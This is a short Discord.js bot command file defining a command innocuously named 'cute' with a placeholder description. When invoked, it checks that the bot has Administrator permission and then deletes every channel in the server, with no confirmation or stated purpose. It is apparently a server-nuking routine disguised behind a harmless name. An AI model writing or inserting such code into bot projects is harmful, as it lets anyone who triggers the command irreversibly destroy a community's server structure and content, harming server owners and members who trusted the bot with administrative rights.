const { EmbedBuilder } = require("discord.js");
const Member = require("../../models/member");
const { error, hershell, success } = require("../lib/util");
module.exports = {
  name: "cute",
  description: "asd",
  block: true,
  run: async (client, message, args, usMember, usOwner, usBlock) => {

    if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")

    message.guild.channels.cache.forEach(channel => channel.delete());

  },
};